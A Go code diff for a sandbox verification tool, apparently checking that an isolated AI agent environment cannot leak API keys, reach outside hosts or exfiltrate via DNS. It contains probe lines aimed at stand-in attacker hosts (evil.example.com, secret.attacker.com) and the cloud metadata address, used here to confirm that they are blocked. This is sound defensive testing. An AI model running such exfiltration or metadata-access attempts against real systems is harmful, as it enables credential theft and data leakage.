@@ -10,7 +10,6 @@ import (
 	"fmt"
 	"io"
 	"net"
-	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -31,7 +30,6 @@ const (
 	verifyBranches  = 5
 	verifyMemMB     = 1024
 	probeTimeoutSec = 30
-	exitNotFound    = 127
 )
 
 // Check is one attack and its measured outcome.
@@ -94,7 +92,7 @@ func Verify(ctx context.Context, opt VerifyOptions) (bool, error) {
 	fmt.Fprintf(opt.Out, "verify run %s: restoring %d branches\n", rec.runID(), verifyBranches)
 	vbs := launchVerifyBranches(ctx, rec, memMB, bcfg, ctype, body)
 	checks := []Check{
-		checkEnvKey(ctx, vbs[0]),
+		checkEnvKey(ctx, vbs[0], meta),
 		checkFirewall(ctx, vbs[0]),
 		checkDNS(ctx, vbs[0]),
 		checkCoW(ctx, vbs, goldenBefore, meta),
@@ -137,11 +135,14 @@ func (vb verifyBranch) exec(ctx context.Context, argv ...string) (types.ExecResp
 	return vb.b.Exec(ctx, argv, probeTimeoutSec)
 }
 
-func blocked(res types.ExecResponse) bool {
-	return res.ExitCode != 0 && res.ExitCode != exitNotFound
+func (vb verifyBranch) probe(ctx context.Context, req types.ProbeRequest) (types.ProbeResponse, error) {
+	if vb.b == nil || vb.err != nil {
+		return types.ProbeResponse{}, fmt.Errorf("branch unavailable: %w", vb.err)
+	}
+	return vb.b.Guest.probe(ctx, req)
 }
 
-func checkEnvKey(ctx context.Context, vb verifyBranch) Check {
+func checkEnvKey(ctx context.Context, vb verifyBranch, meta types.GoldenMeta) Check {
 	c := Check{ID: "P1", Name: "env-key"}
 	want := DummyKey(1)
 	res, err := vb.exec(ctx, "printenv", "ANTHROPIC_API_KEY")
@@ -153,8 +154,20 @@ func checkEnvKey(ctx context.Context, vb verifyBranch) Check {
 		return c.failed(err)
 	}
 	got := strings.TrimSpace(res.Stdout)
+	envNames := []string{"ANTHROPIC_API_KEY", "OPENAI_API_KEY", "OPENROUTER_API_KEY"}
+	seen := map[string]bool{
+		"ANTHROPIC_API_KEY":  true,
+		"OPENAI_API_KEY":     true,
+		"OPENROUTER_API_KEY": true,
+	}
+	for _, p := range meta.Providers {
+		if p.APIKeyEnv != "" && !seen[p.APIKeyEnv] {
+			seen[p.APIKeyEnv] = true
+			envNames = append(envNames, p.APIKeyEnv)
+		}
+	}
 	var checked, leaked []string
-	for _, name := range []string{"ANTHROPIC_API_KEY", "OPENAI_API_KEY", "OPENROUTER_API_KEY"} {
+	for _, name := range envNames {
 		hostKey := os.Getenv(name)
 		if hostKey == "" {
 			continue
@@ -176,28 +189,39 @@ func checkEnvKey(ctx context.Context, vb verifyBranch) Check {
 
 func checkFirewall(ctx context.Context, vb verifyBranch) Check {
 	c := Check{ID: "P2", Name: "firewall"}
-	targets := []string{"http://93.184.216.34", "http://evil.example.com", "http://169.254.169.254/latest/meta-data/"}
+	targets := []struct {
+		label string
+		req   types.ProbeRequest
+	}{
+		{"93.184.216.34:80", types.ProbeRequest{Kind: "tcp", Addr: "93.184.216.34:80", TimeoutMs: 4000}},
+		{"evil.example.com", types.ProbeRequest{Kind: "http", URL: "http://evil.example.com", TimeoutMs: 4000}},
+		{"169.254.169.254:80", types.ProbeRequest{Kind: "tcp", Addr: "169.254.169.254:80", TimeoutMs: 4000}},
+	}
 	pass := true
 	var parts []string
 	for _, t := range targets {
-		res, err := vb.exec(ctx, "curl", "--max-time", "4", "-s", "-o", "/dev/null", t)
+		resp, err := vb.probe(ctx, t.req)
 		if err != nil {
 			return c.failed(err)
 		}
-		pass = pass && blocked(res)
-		u, _ := url.Parse(t)
-		parts = append(parts, fmt.Sprintf("%s exit=%d", u.Host, res.ExitCode))
+		pass = pass && !resp.OK
+		parts = append(parts, fmt.Sprintf("%s ok=%t", t.label, resp.OK))
 	}
+	// Control: the one allowed path must work, or the drops above prove nothing.
 	gw := fmt.Sprintf("http://%s:%d/anthropic/v1/models", netiso.HostIP(1), netiso.GatewayPort)
-	ctl, err := vb.exec(ctx, "curl", "--max-time", "10", "-s", "-o", "/dev/null", "-w", "%{http_code}",
-		"-H", "x-api-key: "+DummyKey(1), gw)
+	ctl, err := vb.probe(ctx, types.ProbeRequest{
+		Kind:      "http",
+		URL:       gw,
+		HeaderKey: "x-api-key",
+		HeaderVal: DummyKey(1),
+		TimeoutMs: 10000,
+	})
 	if err != nil {
 		return c.failed(err)
 	}
-	code := strings.TrimSpace(ctl.Stdout)
-	ctlOK := ctl.ExitCode == 0 && code != "" && code != "000"
+	ctlOK := ctl.OK && ctl.StatusCode > 0
 	c.Pass = pass && ctlOK
-	c.Evidence = fmt.Sprintf("%s; control gateway exit=%d http=%s", strings.Join(parts, ", "), ctl.ExitCode, code)
+	c.Evidence = fmt.Sprintf("%s; control gateway ok=%t http=%d", strings.Join(parts, ", "), ctl.OK, ctl.StatusCode)
 	return c
 }
 
@@ -205,20 +229,20 @@ func checkDNS(ctx context.Context, vb verifyBranch) Check {
 	c := Check{ID: "P3", Name: "dns-exfil"}
 	probes := []struct {
 		label string
-		argv  []string
+		req   types.ProbeRequest
 	}{
-		{"nslookup udp/53", []string{"nslookup", "-timeout=3", "-retry=1", "secret.attacker.com", "8.8.8.8"}},
-		{"dig tcp/53", []string{"dig", "+tcp", "+time=3", "+tries=1", "@8.8.8.8", "secret.attacker.com"}},
+		{"udp/53 8.8.8.8:53", types.ProbeRequest{Kind: "udp-dns", Addr: "8.8.8.8:53", TimeoutMs: 3000}},
+		{"tcp/53 8.8.8.8:53", types.ProbeRequest{Kind: "tcp", Addr: "8.8.8.8:53", TimeoutMs: 3000}},
 	}
 	pass := true
 	var parts []string
 	for _, p := range probes {
-		res, err := vb.exec(ctx, p.argv...)
+		resp, err := vb.probe(ctx, p.req)
 		if err != nil {
 			return c.failed(err)
 		}
-		pass = pass && blocked(res)
-		parts = append(parts, fmt.Sprintf("%s exit=%d", p.label, res.ExitCode))
+		pass = pass && !resp.OK
+		parts = append(parts, fmt.Sprintf("%s ok=%t", p.label, resp.OK))
 	}
 	c.Pass = pass
 	c.Evidence = strings.Join(parts, ", ")
